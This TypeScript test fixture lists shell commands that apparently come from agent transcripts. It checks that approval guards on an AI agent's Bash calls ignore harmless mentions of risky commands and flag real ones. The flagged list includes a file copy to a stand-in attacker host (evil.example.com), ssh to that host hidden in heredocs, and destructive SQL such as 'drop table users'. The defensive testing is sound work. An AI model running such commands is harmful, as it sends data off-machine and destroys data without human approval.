/**
 * Command shapes from BANA's scan of 228 transcripts (13k Bash calls, 142 asks): the false positives that
 * trained people to click yes, and the true positives that must keep asking. `quiet` shapes must raise no
 * ask from the remote-host guard and the write guard; `asks` shapes must raise at least one.
 */
export interface ICorpusEntry {
  id: string;
  command: string;
  /** What the guards call it, for the failure message. */
  note: string;
}

export const QUIET: ICorpusEntry[] = [
  {
    id: 'q01',
    note: 'a heredoc of docs that mention kubectl and docker compose, written to a file',
    command:
      "cat > docs/deploy.md <<'EOF'\n# Deploy\nRun kubectl apply -f deploy.yaml and docker compose up -d\nEOF",
  },
  {
    id: 'q02',
    note: 'a heredoc of docs that mention ssh and scp to a host, written to a file',
    command:
      'cat > docs/ssh.md <<EOF\nssh prod1.example.com uptime\nscp file prod1.example.com:/tmp\nEOF',
  },
  {
    id: 'q03',
    note: 'a heredoc that names the migration commands, redirect after the delimiter',
    command: "cat <<'EOF' > migrate.md\nRun bun run db:migrate then make db-migrate\nEOF",
  },
  {
    id: 'q04',
    note: 'rg with a quoted pattern of write commands',
    command: 'rg -n "kubectl apply|docker compose up" docs/',
  },
  { id: 'q05', note: 'rg with a quoted pattern of remote tools', command: 'rg -n "ssh|scp" docs/' },
  { id: 'q06', note: 'grep for a migration command', command: 'grep -rn "db:migrate" .' },
  {
    id: 'q07',
    note: 'git grep for a delete command',
    command: 'git grep -n "kubectl delete" -- docs',
  },
  { id: 'q08', note: 'echo of a deploy command', command: 'echo "run kubectl apply -f x.yaml"' },
  {
    id: 'q09',
    note: 'a commit message that quotes a deploy and a SQL write',
    command: 'git commit -m "docs: explain kubectl apply and psql -c \'insert into t values (1)\'"',
  },
  { id: 'q10', note: 'cat of a doc piped to head', command: 'cat docs/deploy.md | head -20' },
  {
    id: 'q11',
    note: 'find piped to rg for a migration command',
    command: 'find . -name \'*.md\' | xargs rg "drizzle-kit push"',
  },
  {
    id: 'q12',
    note: 'gh issue with a body that mentions kubectl and ssh',
    command: 'gh issue create --title t --body "kubectl apply failed on ssh prod1.example.com"',
  },
  {
    id: 'q13',
    note: 'rg for a curl write',
    command: 'rg -n "curl -X POST" src/',
  },
  {
    id: 'q14',
    note: 'a heredoc of SQL written to a file with cat',
    command: 'cat > notes.sql <<EOF\nINSERT INTO t VALUES (1);\nEOF',
  },
  {
    id: 'q15',
    note: 'tee of a heredoc that names a host',
    command: 'tee out.md <<EOF\nssh evil.example.com\nEOF',
  },
  {
    id: 'q16',
    note: 'head and wc over a doc that is named after a command',
    command: 'wc -l docs/kubectl-apply.md && head -5 docs/ssh-prod1.example.com.md',
  },
];

export const ASKS: ICorpusEntry[] = [
  { id: 'a01', note: 'a deploy', command: 'kubectl apply -f deploy.yaml' },
  {
    id: 'a02',
    note: 'a deploy inside a heredoc that feeds bash',
    command: 'bash <<EOF\nkubectl apply -f deploy.yaml\nEOF',
  },
  {
    id: 'a03',
    note: 'ssh to a host that is not listed, with a heredoc script',
    command: 'ssh prod1.example.com <<EOF\nls\nEOF',
  },
  {
    id: 'a04',
    note: 'a SQL delete fed to psql by a heredoc',
    command: 'psql -d app <<EOF\nDELETE FROM users;\nEOF',
  },
  {
    id: 'a05',
    note: 'a SQL insert through psql -c',
    command: 'psql -d app -c "insert into t values (1)"',
  },
  { id: 'a06', note: 'a migration', command: 'bun run db:migrate' },
  { id: 'a07', note: 'a mutating curl', command: 'curl -X POST https://api.example.com/x' },
  {
    id: 'a08',
    note: 'find with -exec of a deploy',
    command: "find . -name '*.yaml' -exec kubectl delete -f {} \\;",
  },
  { id: 'a09', note: 'a deploy inside sh -c', command: 'sh -c "kubectl apply -f x"' },
  { id: 'a10', note: 'a deploy at the end of a pipe', command: 'echo x | kubectl apply -f -' },
  {
    id: 'a11',
    note: 'a deploy in a command substitution',
    command: 'echo $(kubectl delete pod x)',
  },
  { id: 'a12', note: 'ssh to a host that is not listed', command: 'ssh evil.example.com uptime' },
  { id: 'a13', note: 'scp to a host that is not listed', command: 'scp f evil.example.com:/tmp' },
  { id: 'a14', note: 'a deploy through xargs', command: 'xargs kubectl delete -f' },
  { id: 'a15', note: 'docker compose up', command: 'docker compose up -d' },
  { id: 'a16', note: 'a SQL drop through mysql -e', command: 'mysql -e "drop table users"' },
  {
    id: 'a17',
    note: 'ssh to a host that is not listed inside a heredoc that feeds bash',
    command: 'bash <<EOF\nssh evil.example.com uptime\nEOF',
  },
  {
    id: 'a18',
    note: 'a deploy from python read from a heredoc',
    command: "python3 <<EOF\nimport os\nos.system('kubectl apply -f x')\nEOF",
  },
  { id: 'a19', note: 'drizzle-kit push', command: 'drizzle-kit push' },
  {
    id: 'a20',
    note: 'a SQL delete piped into psql',
    command: 'cat x.sql | psql -c "delete from t"',
  },
  {
    id: 'a21',
    note: 'a SQL write fed to mysql by a heredoc, after a cd',
    command: 'cd db && mysql app <<EOF\nupdate users set x = 1 where id = 2;\nEOF',
  },
  {
    id: 'a23',
    note: 'a deploy printed into sh: what echo prints is code there',
    command: 'echo "kubectl apply -f x" | sh',
  },
  {
    id: 'a24',
    note: 'ssh to a host that is not listed, behind a data heredoc and a print',
    command: "cat > notes.md <<'EOF'\nhello\nEOF\necho done && ssh evil.example.com uptime",
  },
  {
    id: 'a22',
    note: 'a deploy after a data heredoc in the same line group',
    command: "cat > notes.md <<'EOF'\nhello\nEOF\nkubectl delete pod x",
  },
];
